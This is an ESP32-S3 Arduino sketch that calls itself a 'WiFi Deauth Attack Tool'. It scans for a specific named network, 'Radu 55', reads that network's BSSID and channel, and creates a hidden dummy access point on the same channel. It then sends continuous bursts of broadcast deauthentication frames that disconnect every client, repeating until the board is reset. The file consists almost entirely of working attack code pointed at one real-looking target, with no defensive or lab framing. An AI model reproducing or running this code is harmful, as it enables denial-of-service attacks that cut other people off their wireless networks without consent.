#include <WiFi.h>
#include "wifi_utils.h"

WiFi_Utils wifiUtils(false); // Disable random MAC for deauth testing

// Configuration
const char* TARGET_SSID = "Radu 55";
const int DEAUTH_PACKETS_PER_BURST = 50;  // Number of packets per burst
const int DEAUTH_DELAY_MS = 10;           // Delay between packets (ms)
const int BURST_INTERVAL_MS = 1000;       // Delay between bursts (ms)

// Global variables for attack loop
uint8_t g_targetBSSID[6] = {0};
bool g_attackEnabled = false;
unsigned long g_burstCount = 1;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n========================================");
  Serial.println("  ESP32-S3 WiFi Deauth Attack Tool");
  Serial.println("  Target: Radu 55 Hotspot");
  Serial.println("========================================\n");

  // Step 1: Scan for target network
  Serial.println("📡 Scanning for networks...\n");
  WiFi.mode(WIFI_STA);
  
  wifiData wifiList = wifiUtils.scanWifiList();
  Serial.printf("✓ Found %d networks\n\n", wifiList.num);

  // Step 2: Find Radu 55
  uint8_t targetBSSID[6];
  uint8_t targetChannel = 0;
  bool found = false;

  Serial.println("--- Scan Results ---");
  for (int i = 0; i < wifiList.num; i++) {
    String ssid = String(wifiList.ssid[i].c_str());
    Serial.printf("%d. %s | %s | Ch:%d | %+.0f dBm\n", 
                  i+1, ssid.c_str(), wifiList.bssid[i].c_str(), 
                  wifiList.channel[i], wifiList.signal[i]);

    if (ssid == TARGET_SSID) {
      // Parse BSSID
      const char* bssidStr = wifiList.bssid[i].c_str();
      sscanf(bssidStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &targetBSSID[0], &targetBSSID[1], &targetBSSID[2],
             &targetBSSID[3], &targetBSSID[4], &targetBSSID[5]);
      
      targetChannel = wifiList.channel[i];
      found = true;
    }
  }
  Serial.println("--------------------\n");

  if (!found) {
    Serial.println("❌ Target not found!");
    return;
  }

  Serial.println("🎯 Target Found!");
  Serial.printf("SSID:    %s\n", TARGET_SSID);
  Serial.printf("MAC:     %02X:%02X:%02X:%02X:%02X:%02X\n", 
                targetBSSID[0], targetBSSID[1], targetBSSID[2],
                targetBSSID[3], targetBSSID[4], targetBSSID[5]);
  Serial.printf("Channel: %d\n\n", targetChannel);

  // Step 3: Configure WiFi for packet injection
  Serial.println("⚙️  Configuring WiFi for packet injection...");
  
  // Disconnect and configure AP mode
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(100);
  
  // Create a hidden dummy AP on same channel (required for ESP32 to send frames)
  Serial.printf("📡 Creating dummy AP on channel %d...\n", targetChannel);
  WiFi.softAP("ESP32", NULL, targetChannel, 1, 0); // Hidden AP, max 0 clients
  delay(200);

  // Confirm channel
  Serial.printf("📻 Verifying channel %d...\n", targetChannel);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);

  Serial.println("✓ WiFi configured!\n");

  // Step 4: Prepare for continuous attack
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  // Store target BSSID for loop
  memcpy(g_targetBSSID, targetBSSID, 6);
  g_attackEnabled = true;
  
  Serial.println("========================================");
  Serial.println("⚠️  STARTING DEAUTH ATTACK");
  Serial.println("========================================");
  Serial.printf("Sending %d packets per burst\n", DEAUTH_PACKETS_PER_BURST);
  Serial.printf("Broadcasting to ALL clients\n");
  Serial.println("Continuous attack - Press RESET to stop\n");

  // Send first burst
  Serial.print("💥 Burst 1... ");
  wifiUtils.sendDeauthBurst(targetBSSID, broadcast, DEAUTH_PACKETS_PER_BURST, DEAUTH_DELAY_MS);
  Serial.println("Sent!");
}


void loop() {
  if (!g_attackEnabled) {
    delay(1000);
    return;
  }

  static unsigned long lastBurst = millis();
  
  if (millis() - lastBurst >= BURST_INTERVAL_MS) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    g_burstCount++;
    Serial.printf("💥 Burst %lu... ", g_burstCount);
    wifiUtils.sendDeauthBurst(g_targetBSSID, broadcast, DEAUTH_PACKETS_PER_BURST, DEAUTH_DELAY_MS);
    Serial.println("Sent!");
    
    lastBurst = millis();
  }
}
